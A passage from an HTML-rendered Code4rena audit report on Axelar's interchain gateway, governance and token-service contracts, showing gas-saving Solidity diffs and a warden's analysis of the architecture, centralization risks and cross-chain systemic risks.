(</span><span class=\"mtk12\">_allowance</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">95</span><span class=\"mtk1\">: </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">allowance_</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">96</span><span class=\"mtk1\">: </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">allowance_</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">97</span><span class=\"mtk1\">: </span><span class=\"mtk12\">allowance_</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/interchain-token/InterchainToken.sol#L56-L58\">https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/interchain-token/InterchainToken.sol#L56-L58</a></p>\n<h2 id=\"g-11-splitting-requireif-statements-that-use--saves-gas\" style=\"position:relative;\"><a href=\"#g-11-splitting-requireif-statements-that-use--saves-gas\" aria-label=\"g 11 splitting requireif statements that use  saves gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-11] Splitting <code>require()/if()</code> statements that use <code>&#x26;&#x26;</code> saves gas</h2>\n<p>Saves <code>52 GAS</code> in 4 instances.</p>\n<p>This <a href=\"https://github.com/code-423n4/2022-01-xdefi-findings/issues/128\">issue</a> describes the fact that there is a larger deployment gas cost, but with enough runtime calls, the change ends up being cheaper by 13 gas.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"89\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">FILE: 2023-07-axelar/contracts/its/remote-address-validator/RemoteAddressValidator.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">58:  if ((b &gt;= 65) &amp;&amp; (b &lt;= 70)) bytes(s)[i] = bytes1(b + uint8(32));</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/remote-address-validator/RemoteAddressValidator.sol#L58\">https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/remote-address-validator/RemoteAddressValidator.sol#L58</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"90\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">FILE: 2023-07-axelar/contracts/cgp/AxelarGateway.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">88: if (msg.sender != getAddress(KEY_MINT_LIMITER) &amp;&amp; msg.sender != getAddress(KEY_GOVERNANCE)) revert NotMintLimiter();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">446: if (!success || (returnData.length != uint256(0) &amp;&amp; !abi.decode(returnData, (bool)))) revert BurnFailed(symbol);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">635: if (limit &gt; 0 &amp;&amp; amount &gt; limit) revert ExceedMintLimit(symbol);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/cgp/AxelarGateway.sol#L88\">https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/cgp/AxelarGateway.sol#L88</a></p>\n<h2 id=\"g-12-caching-global-variables-is-more-expensive-than-using-the-actual-variable-use-msgsender-instead-of-caching-it\" style=\"position:relative;\"><a href=\"#g-12-caching-global-variables-is-more-expensive-than-using-the-actual-variable-use-msgsender-instead-of-caching-it\" aria-label=\"g 12 caching global variables is more expensive than using the actual variable use msgsender instead of caching it permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-12] Caching global variables is more expensive than using the actual variable (use <code>msg.sender</code> instead of caching it)</h2>\n<p>The <code>msg.sender</code> variable is a special variable that always refers to the address of the sender of the current transaction. This variable is not stored in memory, so it is much cheaper to use than a cached global variable.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"91\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">FILE: Breadcrumbs2023-07-axelar/contracts/its/interchain-token-service/InterchainTokenService.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 348:  address deployer_ = msg.sender;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 349:        tokenId = getCustomTokenId(deployer_, salt);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 349:        tokenId = getCustomTokenId(msg.sender, salt);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">350:        _deployTokenManager(tokenId, tokenManagerType, params);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 351:        emit CustomTokenIdClaimed(tokenId, deployer_, salt);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 351:        emit CustomTokenIdClaimed(tokenId, msg.sender, salt);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        address deployer_ = msg.sender;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-         tokenId = getCustomTokenId(deployer_, salt);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+         tokenId = getCustomTokenId(msg.sender, salt);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        _deployRemoteTokenManager(tokenId, destinationChain, gasValue, tokenManagerType, params);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        emit CustomTokenIdClaimed(tokenId, deployer_, salt);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        emit CustomTokenIdClaimed(tokenId, msg.sender, salt);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  address caller = msg.sender;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ITokenManager tokenManager = ITokenManager(getValidTokenManagerAddress(tokenId));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        IERC20 token = IERC20(tokenManager.tokenAddress());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        SafeTokenTransferFrom.safeTransferFrom(token, caller, destinationAddress, amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        SafeTokenTransferFrom.safeTransferFrom(token, msg.sender, destinationAddress, amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        _setExpressReceiveToken(tokenId, destinationAddress, amount, commandId, caller);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   _setExpressReceiveToken(tokenId, destinationAddress, amount, commandId, msg.sender);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- address caller = msg.sender;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ITokenManager tokenManager = ITokenManager(getValidTokenManagerAddress(tokenId));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        IERC20 token = IERC20(tokenManager.tokenAddress());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        SafeTokenTransferFrom.safeTransferFrom(token, caller, destinationAddress, amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        SafeTokenTransferFrom.safeTransferFrom(token, msg.sender, destinationAddress, amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        _expressExecuteWithInterchainTokenToken(tokenId, destinationAddress, sourceChain, sourceAddress, data, amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        _setExpressReceiveTokenWithData(tokenId, sourceChain, sourceAddress, destinationAddress, amount, data, commandId, caller);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        _setExpressReceiveTokenWithData(tokenId, sourceChain, sourceAddress, destinationAddress, amount, data, commandId, msg.sender);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/interchain-token-service/InterchainTokenService.sol#L372-L375\">https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/interchain-token-service/InterchainTokenService.sol#L372-L375</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"92\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">FILE: Breadcrumbs2023-07-axelar/contracts/its/interchain-token/InterchainToken.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- address sender = msg.sender;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ITokenManager tokenManager = getTokenManager();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        /**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         * @dev if you know the value of `tokenManagerRequiresApproval()` you can just skip the if statement and just do nothing or _approve.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        if (tokenManagerRequiresApproval()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            uint256 allowance_ = allowance[sender][address(tokenManager)];-            </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+           uint256 allowance_ = allowance[msg.sender][address(tokenManager)];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            if (allowance_ != type(uint256).max) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                if (allowance_ &gt; type(uint256).max - amount) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    allowance_ = type(uint256).max - amount;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                _approve(sender, address(tokenManager), allowance_ + amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                _approve(msg.sender, address(tokenManager), allowance_ + amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/interchain-token/InterchainToken.sol#L49\">https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/interchain-token/InterchainToken.sol#L49</a></p>\n<hr>\n<h1 id=\"audit-analysis\" style=\"position:relative;\"><a href=\"#audit-analysis\" aria-label=\"audit analysis permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Audit Analysis</h1>\n<p>For this audit, 7 analysis reports were submitted by wardens. An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/272\">report highlighted below</a> by <strong>pcarranzav</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/495\">libratus</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/402\">Sathish9098</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/503\">MrPotatoMagic</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/355\">K42</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/327\">Jeiwan</a>, and <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/325\">niloy</a>.</em></p>\n<h3 id=\"summary-of-the-contracts-in-scope\" style=\"position:relative;\"><a href=\"#summary-of-the-contracts-in-scope\" aria-label=\"summary of the contracts in scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary of the contracts in scope</h3>\n<p>The audited contracts are part of Axelar Network’s interchain general message passing, governance and token transfer services. The assets in scope implement a few new features:</p>\n<ul>\n<li>In <code>AxelarGateway</code>, a new upgrade mechanism (that uses interchain decentralized governance) is introduced. Additionally, a mint limiter role is added, setting limits to the amounts that can be minted for any token that supports interchain minting.</li>\n<li>Related to the above, a general interchain governance mechanism is introduced, that allows a combination of interchain messages and multisignature wallet transactions to execute arbitrary governance proposals across chains.</li>\n<li>A general interchain token service. This service allows users to permissionlessly deploy new token managers that act as bridges for arbitrary tokens, using a variety of patterns, e.g. a typical mint/burn bridge or a lock/unlock bridge.</li>\n</ul>\n<p>The codebase also includes helpers that allow deploying contracts using the <code>CREATE3</code> pattern, that produces a deployment address which is solely dependent on the sender address and a chosen salt, not the bytecode.</p>\n<h3 id=\"methodology-and-time-spent\" style=\"position:relative;\"><a href=\"#methodology-and-time-spent\" aria-label=\"methodology and time spent permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Methodology and time spent</h3>\n<p>I spent about 11 hours diving deep into the codebase, then a couple more cleaning up the reports, thinking through the proofs of concept, and preparing the submissions (including this report). My approach was straightforward: visual inspection of the codebase, cross-checking with unit tests and documentation, and thinking through potential edge cases related to timing, reentrancy, ordering of transactions, etc.</p>\n<p>I believe I did a thorough review of the governance-related changes, but a slightly less in-depth review of the interchain token service. The following summarizes my findings and thoughts from what I could gather in this time.</p>\n<p>I focused on High/Medium severity issues (though I only found Medium ones) and this Analysis, so it’s likely that I won’t be submitting a QA or gas report. The audit bots seem to have caught some of the usual QA issues, so I will highlight some things that are not covered in bot output, and affect the code in a broader way, in “Other recommendations” below.</p>\n<h3 id=\"newunexpected-things\" style=\"position:relative;\"><a href=\"#newunexpected-things\" aria-label=\"newunexpected things permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>New/unexpected things</h3>\n<ul>\n<li>I wasn’t familiar with the <code>CREATE3</code> pattern, and it looks very useful. It does introduce some risks, as it makes it easier to deploy contracts with the same address in other chains, which could have unintended consequences (this relates to one of the Medium severity issues I submitted).</li>\n<li>Even though it’s out of scope, the <code>EternalStorage</code> pattern is an interesting approach that I wasn’t familiar with either. I can see how it adds flexibility to handle storage during upgrades. However, it also increases the complexity as it requires specific getters for each variable, and it’s unclear to me if the benefits outweigh the increased attack surface and potential for errors. I’d be curious to hear how this has worked out for this team so far.</li>\n<li>The express token transfer mechanism is impressive; the idea that someone can send the tokens to the destination ahead of time and then be paid back when the message is received is a great way to do fast bridging, in a mostly trustless way.</li>\n</ul>\n<h3 id=\"architecture-feedback\" style=\"position:relative;\"><a href=\"#architecture-feedback\" aria-label=\"architecture feedback permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Architecture feedback</h3>\n<p>Generally, the codebase looks clean and the architecture seems sound. Interchain governance and generalized token bridging are massive problems to tackle and the developers have approached them in a straightforward, simple way.</p>\n<p>I’ve raised a couple Medium issues that relate to timing and ordering of messages and transactions on the multisig and the interchain governance contracts. This would prompt me to suggest taking a closer look at potential timing conditions with interchain messages, and the impact of messages getting delayed due to gas. This is one of the trickiest things to get right when doing cross-chain messaging, so I wouldn’t be surprised if there are a few other edge cases where this could cause issues.</p>\n<p>A general suggestion I have for the architecture is on the amount of proxy contracts that are defined in the codebase. A lot of different proxies are available, and in some cases there is very little difference between each type. This leads to some duplication, e.g. proxy fallback functions re-implemented in several places, which increases the attack surface and risk of errors. I would suggest, on a future iteration, to attempt to combine some of these into fewer contracts to improve maintainability. For instance, proxies that differ only in the <code>contractId()</code> could have the ID be defined as an immutable and set at proxy deployment time.</p>\n<h3 id=\"centralization-risks\" style=\"position:relative;\"><a href=\"#centralization-risks\" aria-label=\"centralization risks permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Centralization risks</h3>\n<p>Some of the contracts in scope present upgrade mechanisms, but use decentralized governance with timelocks. The cases are where multisigs are used are a form of centralization risk (especially if the number of signers is low). <code>AxelarServiceGovernance</code> requiring both an interchain approval <em>and</em> a multisig execution provides some additional security against compromised signers.</p>\n<p>In general, token projects using the Axelar gateway token transfer service are trusting the Axelar network and its governance mechanism with minting power for their tokens. This governance is decentralized and is part of the core trust assumption when using Axelar. It’s worth noting that the mint limiter is a separate, more centralized role (according to the docs, to be handled through a multisig).</p>\n<p>For the interchain token service, an important centralization risk is noted in <code>DESIGN.md</code>:</p>\n<blockquote>\n<p>Users using Custom Bridges need to trust the deployers as they could easily confiscate the funds of users if they wanted to, same as any <code>ERC20</code> distributor could confiscate the funds of users.</p>\n</blockquote>\n<p>This is an important consideration and ideally it should be mentioned in the user documentation or user interfaces. Luckily, not all bridges suffer this risk, just like not all ERC20s allow confiscation. In particular, canonical tokens, and bridges using standardized tokens where the distributor is the token manager, are less susceptible to the deployer doing arbitrary confiscations or minting. This is something that could be surfaced in documentation or UI as well, so that users can know what trust assumptions they are working with when they bridge with each particular token and bridge combination.</p>\n<p>In the interchain token service, Axelar governance is able to add trusted addresses that can perform arbitrary token transfers on the <code>InterchainTokenService</code>, so this should be noted as an important centralization risk that affects both canonical and custom bridges. I have also raised a Medium severity issue related to this, where the deployer address retains this ability even after the ownership is transferred to a governance account.</p>\n<h3 id=\"systemic-risks\" style=\"position:relative;\"><a href=\"#systemic-risks\" aria-label=\"systemic risks permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Systemic risks</h3>\n<p>As mentioned above, timing and gas are some things that are tricky to handle in any protocol that uses cross-chain messaging, and this additional complexity introduces some risk from the possibility of stalling/deadlocks and also simply from the fact that it’s a bigger attack surface.</p>\n<p>In general, users of these services that are, for instance, extending a DAO or token with interchain governance or bridging, would be plugging their tokens or DAOs into a multiple-chain, multiple-consensus, multiple-VM super-system, so this should always be done with care. Such a system, going beyond a single chain’s consensus, can suddenly be exposed to unexpected issues like reorgs or consensus problems (e.g. forking) in a separate chain causing an impact in token supply in the token’s “native” chain.</p>\n<p>Luckily, it seems the team has considered these risks and at first sight Axelar Network has mechanisms to mitigate them (as mentioned in section 5.2 of the <a href=\"https://axelar.network/axelar_whitepaper.pdf\">Axelar whitepaper</a>), but I’d need to do a deeper dive into the rest of the codebase to assert this with more confidence that all the potential risks stemming from this are covered.</p>\n<h3 id=\"other-recommendations\" style=\"position:relative;\"><a href=\"#other-recommendations\" aria-label=\"other recommendations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Other recommendations</h3>\n<ul>\n<li>Comments in a lot of the contracts are sparse; spending some time adding NatSpec to all functions, storage variables and modifiers could really help with maintainability. Even just having a <code>@notice</code> on all external/public functions would be a big improvement. This is especially important for things like <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/9f642fe854eb11ad9f18fe028e5a8353c258e926/contracts/cgp/AxelarGateway.sol#L291-L292\">this</a>. This audit note is important enough that including it 